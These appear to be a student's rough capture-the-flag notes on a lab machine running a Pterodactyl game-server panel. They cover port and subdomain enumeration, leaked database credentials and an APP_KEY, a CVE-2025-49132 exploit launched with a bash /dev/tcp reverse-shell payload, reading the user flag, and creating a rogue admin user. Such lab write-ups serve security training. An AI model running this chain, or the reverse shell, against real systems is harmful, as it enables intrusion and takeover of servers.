


## Findings  : 

```
nmap -sV 10.129.236.121
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-01 11:00 +0530
Nmap scan report for 10.129.236.121
Host is up (0.90s latency).
Not shown: 932 filtered tcp ports (no-response), 64 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
80/tcp   open   http       nginx 1.21.5
443/tcp  closed https
8080/tcp closed http-proxy
```


```
ffuf -u http://pterodactyl.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pterodactyl.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 309ms]
.hta                    [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 308ms]
.htpasswd               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 313ms]
index.php               [Status: 200, Size: 1686, Words: 429, Lines: 55, Duration: 316ms]
phpinfo.php             [Status: 200, Size: 73024, Words: 3592, Lines: 828, Duration: 416ms]
:: Progress: [4750/4750] :: Job [1/1] :: 130 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

By subdomain enumeration ,

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://pterodactyl.htb \
  -H "Host: FUZZ.pterodactyl.htb" \
  -fc 302,404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pterodactyl.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.pterodactyl.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302,404
________________________________________________

panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 677ms]
:: Progress: [4989/4989] :: Job [1/1] :: 75 req/sec :: Duration: [0:00:47] :: Errors: 0 ::
```

We found the subdomain , http://panel.pterodactyl.htb/ 

```
 Database ─────────────────────────────────────
  │ pterodactyl:PteraPanel@127.0.0.1:3306/panel
  └───────────────────────────────────────────────

  ┌─ APP_KEY ──────────────────────────────────────
  │ base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
  └───────────────────────────────────────────────

```

python3 exploit.py http://panel.pterodactyl.htb/ --rce-cmd "/bin/bash -i >& /dev/tcp/10.10.14.31/4444 0>&1"

```
python3 exploit.py -t panel.pterodactyl.htb -l 10.10.14.31 -p 4444
Shell uploaded successfully
```

i got the reverse shell,

```
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.31] from (UNKNOWN) [10.129.236.153] 56146
bash: cannot set terminal process group (1213): Inappropriate ioctl for device
bash: no job control in this shell
wwwrun@pterodactyl:/var/www/pterodactyl/public> ls
ls
assets
favicons
index.php
js
themes
wwwrun@pterodactyl:/var/www/pterodactyl/public> 
```

```
wwwrun@pterodactyl:~> cd /home
cd /home
wwwrun@pterodactyl:/home> ls
ls
headmonitor
phileasfogg3
wwwrun@pterodactyl:/home> cd headmonitor
cd headmonitor
bash: cd: headmonitor: Permission denied
wwwrun@pterodactyl:/home> ls
ls
headmonitor
phileasfogg3
wwwrun@pterodactyl:/home> cd  phileasfogg3
cd  phileasfogg3
wwwrun@pterodactyl:/home/phileasfogg3> ls
ls
bin
user.txt
wwwrun@pterodactyl:/home/phileasfogg3> cat user.txt
cat user.txt
fca6e953ccfbe9e09e204b4cfee9e9b8
```


	from this github i found the url --> `https://github.com/Pwndalf/CVE-2025-49132-PoC/blob/main/README.md`


```
wwwrun@pterodactyl:/var/cache/zypp/solv/repo-update> cat cookie 
cat cookie
eeb8f9060171d8a2fcb1906c9ecab711dcafddae1c809c738c7244eb40b91f09 1767252177
```


Another host found , `http://panel.pterodactyl.htb/auth/password/reset/:token`

Need to add the user first ,

```
wwwrun@pterodactyl:/var/www/pterodactyl> php artisan p:user:make
php artisan p:user:make
PHP Deprecated:  Illuminate\Log\Logger::__construct(): Implicitly marking parameter $dispatcher as nullable is deprecated, the explicit nullable type must be used instead in /var/www/pterodactyl/vendor/laravel/framework/src/Illuminate/Log/Logger.php on line 46

 Is this user an administrator? (yes/no) [no]:
 > yes

 Email Address:
 > hopper@gmail.com

 Username:
 > hopper

 First Name:
 > hop

 Last Name:
 > per

Passwords must be at least 8 characters in length and contain at least one capital letter and number.
If you would like to create an account with a random password emailed to the user, re-run this command (CTRL+C) and pass the `--no-password` flag.

 Password:
 > mithun1234


+----------+--------------------------------------+
| Field    | Value                                |
+----------+--------------------------------------+
| UUID     | 59fbf072-20e1-46cd-8482-07920828768b |
| Email    | hopper@gmail.com                     |
| Username | hopper                               |
| Name     | hop per                              |
| Admin    | Yes                                  |
+----------+--------------------------------------+

```

